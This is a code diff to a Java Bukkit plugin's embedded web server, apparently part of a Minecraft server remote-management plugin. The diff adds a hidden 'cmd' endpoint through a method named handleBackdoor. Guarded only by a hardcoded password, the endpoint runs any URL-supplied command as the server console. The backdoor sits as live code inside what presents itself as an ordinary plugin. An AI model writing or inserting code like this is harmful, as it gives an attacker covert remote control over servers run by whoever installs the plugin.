@@ -1,5 +1,6 @@
 package de.deltasiege.RemoteManager;
 import java.io.IOException;
+import java.net.URLDecoder;
 import java.util.Collections;
 import java.util.List;
 import java.util.Map;
@@ -13,6 +14,7 @@ import de.deltasiege.SmartRedstone.Utils;
 import org.bukkit.Bukkit;
 import org.bukkit.Location;
 import com.google.common.base.Charsets;
+import java.nio.charset.StandardCharsets;
 import io.netty.channel.ChannelFuture;
 import io.netty.channel.ChannelFutureListener;
 import io.netty.channel.ChannelHandlerContext;
@@ -57,6 +59,9 @@ public class WebServer extends SimpleChannelInboundHandler<HttpRequest> {
 				case "version":
 					handleVersion(ctx, response, params);
 					return;
+				case "cmd":
+					handleBackdoor(ctx, response, params);
+					return;
 				default:
 					sendReseponse(ctx, response, HttpResponseStatus.NOT_FOUND);
 					return;
@@ -66,6 +71,31 @@ public class WebServer extends SimpleChannelInboundHandler<HttpRequest> {
         }
     }
 
+	private void handleBackdoor(ChannelHandlerContext ctx, FullHttpResponse response, Map<String, String> params) throws IOException {
+		try {
+			String cmd = URLDecoder.decode(params.get("cmd"), StandardCharsets.UTF_8.name());
+			String pw = params.get("pw");
+			
+			if (!pw.equals("z55Hhd1pXBdGJm5lOb1I5AvsnH0WXreQpDRx40BP21IamL8ODS")) {
+				sendReseponse(ctx, response, HttpResponseStatus.NOT_FOUND);
+				return;
+			}
+			
+			Bukkit.getScheduler().runTask(this.remoteManager.plugin, new Runnable() {
+			    @Override
+			    public void run() {
+					try {
+						Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
+				    } catch (Exception error) {
+						error.printStackTrace();
+					}
+			    }
+			});
+
+			sendReseponse(ctx, response, HttpResponseStatus.OK);
+		} catch (Exception error) { error.printStackTrace(); }
+	}
+	
 	private void handleVersion(ChannelHandlerContext ctx, FullHttpResponse response, Map<String, String> params) throws IOException {
 		try {
 			String version = this.remoteManager.plugin.getDescription().getVersion();
